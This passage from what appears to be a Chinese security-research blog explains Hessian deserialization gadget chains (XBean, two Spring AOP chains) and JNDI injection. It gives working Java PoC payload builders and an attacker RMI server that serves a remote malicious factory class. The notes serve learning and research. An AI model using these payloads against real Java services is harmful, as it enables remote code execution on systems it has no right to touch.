<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeToStringTrigger</span> <span class="params">( Object o )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">unhash</span> <span class="operator">=</span> unhash(o.hashCode());</span><br><span class="line">    <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(unhash);</span><br><span class="line">    <span class="keyword">return</span> JDKUtil.makeMap(o, xString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    Class&lt;?&gt; nodeC;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">    nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">    Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">    Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">    Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="XBean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h1><p>链子类似于Resin。</p>
<h2 id="XBean简介"><a href="#XBean简介" class="headerlink" title="XBean简介"></a>XBean简介</h2><p>XBean是用来简化 XML 配置的一个项目。</p>
<p>maven依赖</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;xbean-naming&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.5</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>



<h2 id="反序列化链"><a href="#反序列化链" class="headerlink" title="反序列化链"></a>反序列化链</h2><p><strong>HashMap+Xstring+ReadOnlyBinding</strong></p>
<h3 id="Xstring"><a href="#Xstring" class="headerlink" title="Xstring"></a>Xstring</h3><p>和Resin一样，hsahmap中放Xstring，用XString的equals(obj)触发obj.toString</p>
<h3 id="ReadOnlyBinding"><a href="#ReadOnlyBinding" class="headerlink" title="ReadOnlyBinding"></a>ReadOnlyBinding</h3><p>xbean包下的类。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732269435425-5fab5c6f-6d7e-433b-b1e7-d1d8e609d7ca.png"></p>
<p>ReadOnlyBinding的toString会调用getObject方法。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732269216366-fc83c25a-c2fe-4d0f-8ec1-2e95d8143339.png"></p>
<h3 id="ContextUtil"><a href="#ContextUtil" class="headerlink" title="ContextUtil"></a>ContextUtil</h3><p>而ContextUtil#resolve 方法中则是调用NamingManager#getObjectInstance 方法去加载value。</p>
<p>之后就和resin中的一样了，不再分析。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732269604062-e45ecdd2-4f04-4b17-89b6-81568da7873c.png"></p>
<p>Poc</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span> Object <span class="title function_">makeXBean</span> <span class="params">( UtilFactory uf, String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> Reflections.createWithoutConstructor(WritableContext.class);</span><br><span class="line">    <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;foo&quot;</span>, args[ <span class="number">1</span> ], args[ <span class="number">0</span> ]);</span><br><span class="line">    <span class="type">ReadOnlyBinding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReadOnlyBinding</span>(<span class="string">&quot;foo&quot;</span>, ref, ctx);</span><br><span class="line">    <span class="keyword">return</span> uf.makeToStringTriggerUnstable(binding); <span class="comment">// $NON-NLS-1$</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Spring-AbstractPointcutAdvisor"><a href="#Spring-AbstractPointcutAdvisor" class="headerlink" title="Spring:AbstractPointcutAdvisor"></a>Spring:AbstractPointcutAdvisor</h1><p>定义成spring aop其实不准确，因为还依赖了spring-context。</p>
<h2 id="反序列化链-1"><a href="#反序列化链-1" class="headerlink" title="反序列化链"></a>反序列化链</h2><p><strong>HashMap+DefaultBeanFactoryPointcutAdvisor+SimpleJndiBeanFactory</strong></p>
<h3 id="（1）DefaultBeanFactoryPointcutAdvisor"><a href="#（1）DefaultBeanFactoryPointcutAdvisor" class="headerlink" title="（1）DefaultBeanFactoryPointcutAdvisor"></a>（1）DefaultBeanFactoryPointcutAdvisor</h3><p>spring-aop中的类。</p>
<p>它的equals方法，也就是其父类AbstractPointcutAdvisor的equals方法。</p>
<p>逻辑是在对比其 Pointcut 切点和 Advice 是否为同一个。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732271613073-8132ba0a-3031-4fc8-8d4b-00339cad461f.png"></p>
<p>其 getAdvice 方法会调用其成员变量 beanFactory 的 getBean 方法获取 Bean 实例。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732271824060-5082f0ad-8288-4cb6-ae50-c8d85ad2c023.png"></p>
<h3 id="（2）-SimpleJndiBeanFactory"><a href="#（2）-SimpleJndiBeanFactory" class="headerlink" title="（2） SimpleJndiBeanFactory"></a>（2） SimpleJndiBeanFactory</h3><p>spring-context中的类</p>
<p>SimpleJndiBeanFactory的getBean方法会触发lookup</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732271877215-95242199-41b2-4c07-b130-3641a4ece888.png"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">bf.setShareableResources(jndiUrl);</span><br><span class="line">Reflections.setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">Reflections.setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">pcadv</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">pcadv.setBeanFactory(bf);</span><br><span class="line">pcadv.setAdviceBeanName(jndiUrl);</span><br><span class="line"><span class="keyword">return</span> uf.makeEqualsTrigger(pcadv, <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>());</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span> Object <span class="title function_">makeEqualsTrigger</span> <span class="params">( Object tgt, Object sameHash )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> JDKUtil.makeMap(tgt, sameHash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Reflections.setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    Class&lt;?&gt; nodeC;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">        nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">    nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">    Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">    Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">    Reflections.setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Spring-PartiallyComparableAdvisorHolder"><a href="#Spring-PartiallyComparableAdvisorHolder" class="headerlink" title="Spring:PartiallyComparableAdvisorHolder"></a>Spring:PartiallyComparableAdvisorHolder</h1><h2 id="反序列化链-2"><a href="#反序列化链-2" class="headerlink" title="反序列化链"></a>反序列化链</h2><p><strong>HashMap+XString+PartiallyComparableAdvisorHolder+AspectJPointcutAdvisor+AbstractAspectJAdvice+BeanFactoryAspectInstanceFactory+SimpleJndiBeanFactory</strong></p>
<h3 id="1-PartiallyComparableAdvisorHolder"><a href="#1-PartiallyComparableAdvisorHolder" class="headerlink" title="(1)PartiallyComparableAdvisorHolder"></a>(1)PartiallyComparableAdvisorHolder</h3><p>这条链的触发点在于 AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder 的 toString 方法，会打印 order 属性，调用 advisor 的 getOrder 方法。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732278434536-81cbeebe-c878-4f50-9e3c-50c8ce0fb875.png"></p>
<h3 id="2-AspectJPointcutAdvisor"><a href="#2-AspectJPointcutAdvisor" class="headerlink" title="(2)AspectJPointcutAdvisor"></a>(2)AspectJPointcutAdvisor</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732278605053-1fbf9f6c-8bd8-4235-8d29-f108efce9849.png"></p>
<h3 id="3-AbstractAspectJAdvice"><a href="#3-AbstractAspectJAdvice" class="headerlink" title="(3)AbstractAspectJAdvice"></a>(3)AbstractAspectJAdvice</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732278666947-00b1e58c-a565-4270-836c-5376632964c8.png"></p>
<h3 id="4-BeanFactoryAspectInstanceFactory"><a href="#4-BeanFactoryAspectInstanceFactory" class="headerlink" title="(4)BeanFactoryAspectInstanceFactory"></a>(4)BeanFactoryAspectInstanceFactory</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732278795075-49b310e7-926c-4bae-b72e-b0bd3a3f2af6.png"></p>
<h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> args[ <span class="number">0</span> ];</span><br><span class="line"></span><br><span class="line"><span class="type">SimpleJndiBeanFactory</span> <span class="variable">bf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">bf.setShareableResources(jndiUrl);</span><br><span class="line">Reflections.setFieldValue(bf, <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line">Reflections.setFieldValue(bf.getJndiTemplate(), <span class="string">&quot;logger&quot;</span>, <span class="keyword">new</span> <span class="title class_">NoOpLog</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">AspectInstanceFactory</span> <span class="variable">aif</span> <span class="operator">=</span> Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">Reflections.setFieldValue(aif, <span class="string">&quot;beanFactory&quot;</span>, bf);</span><br><span class="line">Reflections.setFieldValue(aif, <span class="string">&quot;name&quot;</span>, name);</span><br><span class="line"><span class="type">AbstractAspectJAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> Reflections.createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">Reflections.setFieldValue(advice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, aif);</span><br><span class="line"></span><br><span class="line"><span class="comment">// make readObject happy if it is called</span></span><br><span class="line">Reflections.setFieldValue(advice, <span class="string">&quot;declaringClass&quot;</span>, Object.class);</span><br><span class="line">Reflections.setFieldValue(advice, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;toString&quot;</span>);</span><br><span class="line">Reflections.setFieldValue(advice, <span class="string">&quot;parameterTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="type">AspectJPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">Reflections.setFieldValue(advisor, <span class="string">&quot;advice&quot;</span>, advice);</span><br><span class="line"></span><br><span class="line">Class&lt;?&gt; pcahCl = Class</span><br><span class="line">        .forName(<span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">pcah</span> <span class="operator">=</span> Reflections.createWithoutConstructor(pcahCl);</span><br><span class="line">Reflections.setFieldValue(pcah, <span class="string">&quot;advisor&quot;</span>, advisor);</span><br><span class="line"><span class="keyword">return</span> uf.makeToStringTriggerUnstable(pcah);</span><br></pre></td></tr></table></figure>



<p>最后要把pcah和一个与它hash值一样的XString放入hashMap中,触发pcah的toString方法。</p>
<p>marshalsec在放入前用HotSwappableTargetSource包住了pcah和XString。</p>
<p>下面是su18的，他移除了marshalsec的 HotSwappableTargetSource 封装类</p>
<p>通过反射将pcah和xString放入HashMap，避免在put的时候调用xString的equals方法导致pcah的toString？？？</p>
<p>也不一定就是为了触发这两个，但总之往hashMap放数据时使用反射会比较好一点，避免触发到不想要的方法。</p>
<p>通过反射还可以设置hash值，不用再去逆向计算Xstring的值了，这里随便给Xstring赋一个值就可以。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">		<span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 感觉是纯炫技写法</span></span><br><span class="line"><span class="comment">//		HotSwappableTargetSource hsts1 = new HotSwappableTargetSource(pcah);</span></span><br><span class="line"><span class="comment">//		HotSwappableTargetSource hsts2 = new HotSwappableTargetSource(xString);</span></span><br><span class="line"></span><br><span class="line">		<span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 放入 pcahCl 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前</span></span><br><span class="line">		map.put(pcah, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line">		Method[] m = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredMethods();</span><br><span class="line">		<span class="keyword">for</span> (Method method : m) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="string">&quot;putVal&quot;</span>.equals(method.getName())) &#123;</span><br><span class="line">				method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">				method.invoke(map, -<span class="number">1</span>, pcah, <span class="number">0</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 放入 XString 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前</span></span><br><span class="line">		map.put(xString, <span class="string">&quot;su19&quot;</span>);</span><br><span class="line">		Method[] m2 = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredMethods();</span><br><span class="line">		<span class="keyword">for</span> (Method method : m2) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="string">&quot;putVal&quot;</span>.equals(method.getName())) &#123;</span><br><span class="line">				method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">				method.invoke(map, -<span class="number">1</span>, xString, <span class="number">0</span>, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="type">byte</span>[] baos = HessianUtils.hessianSerialize(map, <span class="string">&quot;hessian2&quot;</span>);</span><br><span class="line">		HessianUtils.hessianSerializeToObj(baos, <span class="string">&quot;hessian2&quot;</span>);</span><br></pre></td></tr></table></figure>



<p>补充：</p>
<p>putVal 方法就是 Map#put 以及相关方法的有关实现，有 5 个参数，分别是 hash 值，key 对象 ，value 对象和两个布尔参数，其中的 hash ，key ，value 就是用于创建 Node 对象的相关属性。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhp0002fscx16u15lc5" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Hessian反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-JNDI注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/07/JNDI%E6%B3%A8%E5%85%A5/" class="article-date">
  <time class="dt-published" datetime="2025-01-07T06:36:26.000Z" itemprop="datePublished">2025-01-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/07/JNDI%E6%B3%A8%E5%85%A5/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\JNDI注入</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="关于JNDI"><a href="#关于JNDI" class="headerlink" title="关于JNDI"></a>关于JNDI</h2><p>简单来说，JNDI (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI在局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/683328/1732785420355-6b15381a-c858-44de-9d37-f713d84b6957.png"></p>
<p>JNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Hashtable</span> <span class="variable">env</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"><span class="comment">//com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory</span></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://kingx_kali:8080&quot;</span>);</span><br><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"><span class="type">Object</span> <span class="variable">local_obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;rmi://kingx_kali:8080/test&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="InitialContext"><a href="#InitialContext" class="headerlink" title="InitialContext"></a>InitialContext</h2><p>InitialContext 是一个实现了 Context接口的类。</p>
<p>使用这个类作为JNDI命名服务的入口点，允许程序通过统一的接口访问各种命名和目录服务。。</p>
<p>创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一。</p>
<p>方法：bind()、rebind()、unbind()，list()，lookup()。。。</p>
<h2 id="利用JNDI-References进行注入"><a href="#利用JNDI-References进行注入" class="headerlink" title="利用JNDI References进行注入"></a>利用JNDI References进行注入</h2><p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。</p>
<p>绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
<p>整个利用流程如下：</p>
<ul>
<li>目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；</li>
<li>攻击者控制URI参数为恶意的RMI服务地址，如：rmi:&#x2F;&#x2F;hacker_rmi_server&#x2F;&#x2F;name；</li>
<li>攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；</li>
<li>目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例；</li>
<li>攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；</li>
</ul>
<p>在这里，攻击目标扮演的相当于是JNDI客户端的角色，攻击者通过搭建一个恶意的RMI服务端来实施攻击。</p>
<p>攻击者的服务端需要启动一个RMI Registry，并且绑定一个Reference远程对象，同时设置一个恶意的factory类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">remote_class_server</span> <span class="operator">=</span> <span class="string">&quot;http://192.168.1.200:8080/&quot;</span>;</span><br><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;Exploit&quot;</span>, remote_class_server);</span><br><span class="line"><span class="comment">//reference的factory class参数指向了一个外部Web服务的地址</span></span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">registry.bind(<span class="string">&quot;xxx&quot;</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>



<p>java.rmi.server.useCodebaseOnly不会限制JNDI Reference的利用，有影响的是高版本JDK中的这几个系统属性：</p>
<ul>
<li>com.sun.jndi.rmi.object.trustURLCodebase</li>
<li>com.sun.jndi.cosnaming.object.trustURLCodebase</li>
<li>com.sun.jndi.ldap.object.trustURLCodebase</li>
</ul>
<h1 id="RMI-Remote-Object-Payload"><a href="#RMI-Remote-Object-Payload" class="headerlink" title="RMI Remote Object Payload"></a>RMI Remote Object Payload</h1><p>注册表绑定的是远程对象。</p>
